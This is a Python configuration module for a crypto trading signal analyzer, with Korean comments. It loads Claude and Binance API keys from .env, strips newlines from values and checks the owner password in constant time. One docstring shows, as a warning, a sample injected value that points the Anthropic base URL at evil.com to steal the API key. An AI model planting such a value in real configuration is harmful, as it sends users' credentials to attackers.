# =============================================
# Crypto Trading Signal Analyzer - Config
# =============================================
# ⚠️ 보안 주의: API 키는 .env 파일에서 관리합니다.
#    .gitignore에 .env를 반드시 추가하세요!

import hmac
import os
from pathlib import Path
from dotenv import load_dotenv

# .env 파일 로드 (실행 위치와 무관하게 현재 파일 기준으로 탐색)
_BASE_DIR = Path(__file__).resolve().parent
load_dotenv(_BASE_DIR / ".env")
load_dotenv()


def _safe_env(key: str, default: str = "") -> str:
    """환경변수를 읽고 CRLF 문자를 제거합니다.

    .env 파일에 개행문자(\\n, \\r)가 포함된 값이 있으면
    python-dotenv 가 추가 변수를 주입(CRLF Injection)할 수 있습니다.
    예: CLAUDE_API_KEY=sk-xxx\\nANTHROPIC_BASE_URL=https://evil.com
    → Claude SDK 가 공격자 서버로 API 키를 전송하는 취약점.
    이를 방지하기 위해 모든 env 값에서 개행문자를 제거합니다.
    """
    val = os.getenv(key, default) or default
    return val.replace("\r", "").replace("\n", "").strip()


# 기본값 "changeme" 와 동일한 값은 "비밀번호 미설정" 으로 취급하기 위한 상수
_OWNER_PASSWORD_DEFAULT = "changeme"


def owner_password_configured() -> bool:
    """OWNER_PASSWORD 가 실제로 설정되어 있는지 여부.

    - 비어 있으면 False
    - 기본값 'changeme' 그대로면 False
    → 실제로 비밀번호를 바꾼 경우에만 인증 기능을 허용한다.
    """
    pw = OWNER_PASSWORD
    return bool(pw) and pw != _OWNER_PASSWORD_DEFAULT


def verify_owner_password(supplied: object) -> bool:
    """타이밍-공격 내성으로 OWNER_PASSWORD 를 비교.

    - 비밀번호가 설정되지 않았으면 어떤 값이 와도 False (기능 비활성)
    - 입력이 str 이 아니면 False
    - hmac.compare_digest 로 상수 시간 비교
    """
    if not owner_password_configured():
        return False
    if not isinstance(supplied, str):
        return False
    return hmac.compare_digest(supplied.encode("utf-8"), OWNER_PASSWORD.encode("utf-8"))


def sanitize_env_value(value: object) -> str:
    """.env 파일에 기록할 값을 안전하게 정리.

    - str 이 아니면 빈 문자열
    - CR/LF/NUL 제거 (줄바꿈 삽입 시 추가 환경변수 주입 가능)
    - 앞뒤 공백 제거
    """
    if not isinstance(value, str):
        return ""
    return value.replace("\r", "").replace("\n", "").replace("\x00", "").strip()


CLAUDE_API_KEY = _safe_env("CLAUDE_API_KEY")
CLAUDE_MODEL   = _safe_env("CLAUDE_MODEL", "claude-sonnet-4-6")

BINANCE_BASE_URL    = "https://api.binance.com"
BINANCE_FUTURES_URL = "https://fapi.binance.com"
BINANCE_API_KEY     = _safe_env("BINANCE_API_KEY")
BINANCE_SECRET_KEY  = _safe_env("BINANCE_SECRET_KEY")
DEFAULT_SYMBOL      = _safe_env("DEFAULT_SYMBOL", "BTCUSDT").upper()


def symbol_to_pair(symbol: str) -> str:
    symbol = (symbol or "").upper()
    quote_candidates = ("USDC", "USDT", "FDUSD", "BUSD", "TUSD", "USD", "BTC", "ETH", "BNB")
    for quote in quote_candidates:
        if symbol.endswith(quote) and len(symbol) > len(quote):
            return f"{symbol[:-len(quote)]}/{quote}"
    return symbol

# ── 매매 설정 (참고용 레버리지) ──────────────
DEFAULT_LEVERAGE      = 3       # 희망 레버리지 배수

OWNER_PASSWORD = _safe_env("OWNER_PASSWORD", _OWNER_PASSWORD_DEFAULT)  # 주인장 확성기 비밀번호

# 분석할 시간봉 목록
TIMEFRAMES = ["5m", "15m", "1h", "4h", "1d"]

# 각 시간봉별 로드할 캔들 수
CANDLE_LIMIT = 200

# 자동 갱신 기본 간격 (초)  ← 30분
AUTO_REFRESH_INTERVAL = 1800

# ── 색상 팔레트 ──────────────────────────────
BG_COLOR      = "#0d0d1a"   # 배경
PANEL_COLOR   = "#13132a"   # 사이드 패널
ACCENT_COLOR  = "#1e1e4a"   # 강조 영역
TEXT_COLOR    = "#dce1f0"   # 기본 텍스트
GREEN_COLOR   = "#00e676"   # 매수
RED_COLOR     = "#ff1744"   # 매도
YELLOW_COLOR  = "#ffd740"   # 홀드 / 강조
BLUE_COLOR    = "#40c4ff"   # 보조
PURPLE_COLOR  = "#ce93d8"   # RSI 선
